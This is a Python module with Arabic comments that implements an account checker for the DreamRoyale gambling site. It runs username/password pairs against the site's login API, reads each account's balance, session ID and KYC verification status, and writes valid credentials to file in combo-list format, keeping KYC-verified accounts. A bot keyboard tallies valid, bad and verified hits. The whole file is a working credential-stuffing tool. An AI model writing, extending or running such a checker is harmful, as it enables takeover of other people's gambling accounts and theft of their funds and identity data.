from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json
import time

class DreamroyaleChecker(BaseChecker):
    """DreamRoyale site checker"""
    
    # الروابط الرئيسية
    LOGIN_URL = "https://www.dreamroyale.com/api/rtg/login"
    KYC_URL = "https://www.dreamroyale.com/api/pages/kyc/status"
    
    # الهيدرات الأساسية
    HEADERS = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'Content-Type': "application/json",
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'origin': "https://www.dreamroyale.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.dreamroyale.com/?ltrackingid=2ga2131cidpidvar1var2var3var4var5affid2108tid7285&laffid=1102",
        'accept-language': "en-US,en;q=0.9",
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single DreamRoyale account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # 1. تسجيل الدخول
            payload = {
                "login": username,
                "password": password,
                "skin_id": 1
            }
            
            response = session.post(
                self.LOGIN_URL,
                json=payload,
                timeout=20
            )
            
            # تحقق من الاستجابة
            if response.status_code == 404:
                return {"status": "bad", "username": username}
            
            if response.status_code != 200:
                return {"status": "error", "username": username, "error": f"HTTP {response.status_code}"}
            
            data = response.json()
            
            # استخراج بيانات الحساب
            account_number = data.get("account_number", "")
            session_id = data.get("session_id", 0)
            balance = float(data.get("balance", 0))
            platform = data.get("platform", "")
            is_cafe_casino = data.get("is_cafe_casino", 0)
            
            # 2. التحقق من KYC
            kyc_status = False
            kyc_message = ""
            
            if account_number:
                try:
                    # استخدام player_id = account_number أو username
                    player_id = account_number if account_number else username
                    
                    kyc_response = session.get(
                        self.KYC_URL,
                        params={'player_id': player_id},
                        timeout=15
                    )
                    
                    if kyc_response.status_code == 200:
                        kyc_data = kyc_response.json()
                        # تحقق من هيكل الرد
                        if kyc_data.get("status") == True:
                            kyc_status = True
                            kyc_message = "Verified"
                        else:
                            kyc_status = False
                            kyc_message = kyc_data.get("message", "Not Verified")
                    elif kyc_response.status_code == 403:
                        kyc_message = "Access Denied"
                    elif kyc_response.status_code == 500:
                        kyc_message = "Database Error"
                    else:
                        kyc_message = f"HTTP {kyc_response.status_code}"
                        
                except Exception as e:
                    kyc_message = f"KYC Error: {str(e)}"
            
            # رتب بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "account_number": account_number,
                "session_id": session_id,
                "balance": balance,
                "platform": platform,
                "is_cafe_casino": is_cafe_casino,
                "kyc_status": kyc_status,
                "kyc_message": kyc_message,
                "has_balance": balance > 0,
                "player_id": account_number or username,
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except requests.exceptions.Timeout:
            return {"status": "error", "username": username, "error": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "error", "username": username, "error": "Connection error"}
        except json.JSONDecodeError:
            return {"status": "error", "username": username, "error": "Invalid JSON response"}
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب"""
        # الشرط: KYC مفعل فقط (بدون شرط الرصيد)
        return account_data.get("kyc_status", False)
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"account={account_data['account_number']} | " \
               f"balance=${account_data['balance']:.2f} | " \
               f"kyc={account_data['kyc_status']} | " \
               f"platform={account_data['platform']} | " \
               f"session_id={account_data['session_id']}\n"
    
    def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
        """تخصيص لوحة الإحصائيات"""
        return {
            "type": "inline_keyboard",
            "buttons": [
                [{"text": f"🔄 Checked: {stats['checked']}/{stats['total']}", "callback_data": "progress"}],
                [
                    {"text": f"✅ Valid: {stats['valid']}", "callback_data": "valid"},
                    {"text": f"❌ Bad: {stats['bad']}", "callback_data": "bad"}
                ],
                [
                    {"text": f"⚠️ Error: {stats['error']}", "callback_data": "error"},
                    {"text": f"🔒 KYC Verified: {stats['saved']}", "callback_data": "saved"}
                ]
            ]
        }
